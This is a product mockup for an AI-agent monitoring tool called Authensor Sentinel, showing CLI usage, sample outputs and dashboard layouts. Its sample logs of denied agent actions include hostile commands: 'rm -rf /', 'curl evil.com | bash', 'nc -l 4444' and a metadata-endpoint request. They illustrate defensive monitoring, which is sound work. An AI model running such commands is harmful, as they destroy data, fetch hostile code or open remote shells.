# Authensor Sentinel — Product Mockup

## CLI Usage

```bash
# Install
npm install @authensor/sentinel

# Start monitoring (connects to control plane)
npx authensor-sentinel --control-plane http://localhost:3000

# Start with alert channels configured
npx authensor-sentinel \
  --slack-webhook https://hooks.slack.com/services/T.../B.../xxx \
  --email alerts@company.com \
  --sms +1234567890

# Check current status
npx authensor-sentinel status

# View live anomaly feed
npx authensor-sentinel tail

# Configure alert rules
npx authensor-sentinel rules add \
  --name "High deny rate" \
  --metric deny_rate \
  --threshold 0.3 \
  --window 5m \
  --severity critical

# List active alerts
npx authensor-sentinel alerts

# Acknowledge an alert
npx authensor-sentinel alerts ack ALT-001

# Show agent behavioral report
npx authensor-sentinel report --agent test-agent --period 7d

# Run as part of authensor CLI
npx authensor sentinel        # starts monitoring
npx authensor sentinel status # check status
```

## CLI Output Examples

### `npx authensor-sentinel tail`
```
┌─────────────────────────────────────────────────────────────────┐
│  AUTHENSOR SENTINEL — Live Monitor                    00:14:32 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Agents: 3 active    Receipts: 1,247 (last 1h)    Alerts: 1   │
│                                                                 │
│  ▂▃▅▇▆▅▃▂▂▃▅▆▇▇▆▅▃▂▁▂▃▅▆▇▆▅▃▂▂▃▄▅▆▇▆▅▃▂  actions/min       │
│                                                                 │
│  LIVE FEED:                                                     │
│  00:14:31  allow   http.request         agent-alpha   2ms       │
│  00:14:31  allow   file.read            agent-beta    1ms       │
│  00:14:30  deny    shell.execute        agent-alpha   3ms       │
│  00:14:30  allow   safe.read.glob       agent-gamma   1ms       │
│  00:14:29  ⚠ DENY  rm -rf /             agent-alpha   2ms       │
│  00:14:28  allow   http.request         agent-beta    2ms       │
│                                                                 │
│  ACTIVE ALERTS:                                                 │
│  ⚠ ALT-001  agent-alpha deny rate 42% (threshold: 30%)  5m ago │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### `npx authensor-sentinel status`
```
  Authensor Sentinel v0.0.1

  Control Plane:  ● connected (http://localhost:3000)
  Monitoring:     ● active since 2h ago
  Receipts seen:  4,892

  Agents:
    agent-alpha    ● healthy    1,204 actions    $2.14 cost    deny rate 3%
    agent-beta     ● healthy      892 actions    $0.87 cost    deny rate 0%
    agent-gamma    ● warning    2,796 actions    $4.31 cost    deny rate 18%

  Alerts (last 24h):
    2 critical   0 warning   0 info

  Alert Channels:
    Slack:   ● connected
    Email:   ● configured (alerts@company.com)
    SMS:     ○ not configured

  Rules: 5 active, 0 paused
```

### `npx authensor-sentinel report --agent agent-alpha --period 24h`
```
  Agent: agent-alpha — 24h Behavioral Report

  Actions:        1,204 total
  Allow rate:     97.1%    (baseline: 98.2%)
  Deny rate:       2.9%    (baseline: 1.3%)  ⚠ above baseline
  Avg latency:      3ms    (baseline: 2ms)
  Total cost:    $2.14     (baseline: $1.80)

  Top Actions:
    http.request      684  (56.8%)
    file.read         312  (25.9%)
    file.write         89  ( 7.4%)
    shell.execute      62  ( 5.1%)
    network.search     57  ( 4.7%)

  Top Denied:
    shell.execute      28  (destructive command patterns)
    file.write          7  (outside workspace boundary)

  Anomalies Detected:
    14:32  Deny spike (5 denies in 30s — baseline: 1/min)
    18:45  Cost spike ($0.42 in 5min — baseline: $0.12/5min)

  Risk Score: 72/100 (moderate)
    ████████████████████████░░░░░░░░
```

---

## Dashboard (HTMX, dark theme, no build step)

### Main Layout

```
┌──────────────────────────────────────────────────────────────────────────┐
│  ◉ AUTHENSOR SENTINEL                               ▼ 24h  ▼ All Agents│
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ┌────────────┐ ┌────────────┐ ┌────────────┐ ┌────────────┐           │
│  │   1,247    │ │    97%     │ │   $7.32    │ │  1 active  │           │
│  │  actions   │ │ allow rate │ │   cost     │ │   alert    │           │
│  │   /hour    │ │            │ │  /hour     │ │            │           │
│  └────────────┘ └────────────┘ └────────────┘ └────────────┘           │
│                                                                          │
│  ┌─── Action Volume ─────────────────────────────────────────────────┐  │
│  │                                                                    │  │
│  │  150 ┤                        ╭─╮                                  │  │
│  │      │                    ╭───╯ ╰──╮      ╭──╮                     │  │
│  │  100 ┤    ╭──╮        ╭──╯        ╰──╮╭──╯  ╰──╮                  │  │
│  │      │╭───╯  ╰──╮╭───╯              ╰╯        ╰──╮                │  │
│  │   50 ┤╯         ╰╯                                ╰──             │  │
│  │      │                                                             │  │
│  │    0 ┤─────────────────────────────────────────────────────────    │  │
│  │      12:00    14:00    16:00    18:00    20:00    22:00   00:00    │  │
│  │                                                                    │  │
│  │  ■ allow  ■ deny  ■ require_approval                              │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌─── Active Alerts ─────────────────────┐ ┌─── Agent Health ─────────┐ │
│  │                                        │ │                          │ │
│  │  ⚠ CRITICAL  ALT-001        5m ago   │ │  agent-alpha    ● 72/100 │ │
│  │  agent-alpha deny rate 42%            │ │  agent-beta     ● 95/100 │ │
│  │  threshold: 30% over 5m window        │ │  agent-gamma    ● 61/100 │ │
│  │  [Acknowledge] [Silence 1h] [Details] │ │  agent-delta    ● 88/100 │ │
│  │                                        │ │                          │ │
│  │  ✓ RESOLVED  ALT-000       2h ago    │ │  ● healthy  ● warning    │ │
│  │  cost spike on agent-gamma            │ │  ● critical              │ │
│  │                                        │ │                          │ │
│  └────────────────────────────────────────┘ └──────────────────────────┘ │
│                                                                          │
│  ┌─── Top Denied Actions ────────────────┐ ┌─── Cost Burn Rate ───────┐ │
│  │                                        │ │                          │ │
│  │  shell.execute         28  ████████░  │ │  $8 ┤     ╭╮              │ │
│  │  file.write             7  ██░        │ │     │  ╭──╯╰──╮           │ │
│  │  network.http           3  █░         │ │  $4 ┤──╯      ╰──╮       │ │
│  │  mcp.tool.invoke        1  ░          │ │     │             ╰──     │ │
│  │                                        │ │  $0 ┤───────────────     │ │
│  │                                        │ │     12  16  20  00      │ │
│  └────────────────────────────────────────┘ └──────────────────────────┘ │
│                                                                          │
│  ┌─── Live Receipt Feed ─────────────────────────────────────────────┐  │
│  │  TIME      DECISION  ACTION            AGENT          COST  DUR   │  │
│  │  00:14:31  ✓ allow   http.request      agent-alpha    $0.01  2ms │  │
│  │  00:14:31  ✓ allow   file.read         agent-beta     —      1ms │  │
│  │  00:14:30  ✗ deny    shell.execute     agent-alpha    —      3ms │  │
│  │  00:14:30  ✓ allow   safe.read.glob    agent-gamma    —      1ms │  │
│  │  00:14:29  ✗ deny    rm -rf /          agent-alpha    —      2ms │  │
│  │  00:14:28  ⏳ approval network.http    agent-delta    —      —   │  │
│  │  00:14:27  ✓ allow   http.request      agent-beta     $0.02  2ms │  │
│  │                                              auto-refresh: 2s ↻  │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌─── Alert Rules ───────────────────────────────────────────────────┐  │
│  │  NAME                 METRIC        THRESHOLD  WINDOW  SEVERITY   │  │
│  │  High deny rate       deny_rate     > 30%      5m      critical   │  │
│  │  Cost spike           cost_rate     > $10/hr   15m     warning    │  │
│  │  Action flood         action_rate   > 500/min  1m      critical   │  │
│  │  Stuck approvals      pending_age   > 30m      —       warning    │  │
│  │  Off-hours activity   action_count  > 0        —       info       │  │
│  │                                                    [+ Add Rule]   │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```

### Alert Detail View (`/sentinel/alerts/ALT-001`)
```
┌──────────────────────────────────────────────────────────────────────────┐
│  ◉ SENTINEL  ›  Alerts  ›  ALT-001                                      │
├──────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  ⚠ CRITICAL — High deny rate                                           │
│                                                                          │
│  Agent:      agent-alpha                                                 │
│  Metric:     deny_rate = 42%  (threshold: 30%)                          │
│  Window:     5 minutes                                                   │
│  Triggered:  2026-03-14 00:09:31 UTC  (5 minutes ago)                   │
│  Status:     Active                                                      │
│                                                                          │
│  [Acknowledge]  [Silence 1h]  [Silence 24h]  [Edit Rule]               │
│                                                                          │
│  ┌─── Deny Rate Over Time ───────────────────────────────────────────┐  │
│  │                                                                    │  │
│  │  50% ┤                              ╭──● current                   │  │
│  │      │                          ╭───╯                              │  │
│  │  30% ┤- - - - - - - - - - - - -╯- - - - - threshold - - - - - -  │  │
│  │      │              ╭───────────╯                                  │  │
│  │  10% ┤──────────────╯                                              │  │
│  │      │                                                             │  │
│  │   0% ┤─────────────────────────────────────────────────────────    │  │
│  │      -30m        -20m        -10m          now                     │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  ┌─── Recent Denied Actions ─────────────────────────────────────────┐  │
│  │  00:14:29  shell.execute  "rm -rf /"              ✗ destructive   │  │
│  │  00:14:15  shell.execute  "curl evil.com | bash"  ✗ exfiltration  │  │
│  │  00:14:02  file.write     "/etc/passwd"           ✗ system file   │  │
│  │  00:13:48  shell.execute  "nc -l 4444"            ✗ reverse shell │  │
│  │  00:13:31  network.http   "169.254.169.254"       ✗ SSRF attempt  │  │
│  └────────────────────────────────────────────────────────────────────┘  │
│                                                                          │
│  Notification History:                                                   │
│  00:09:31  Slack #alerts — delivered ✓                                  │
│  00:09:32  Email alerts@company.com — delivered ✓                       │
│  00:09:33  SMS +1234567890 — delivered ✓                                │
│                                                                          │
└──────────────────────────────────────────────────────────────────────────┘
```
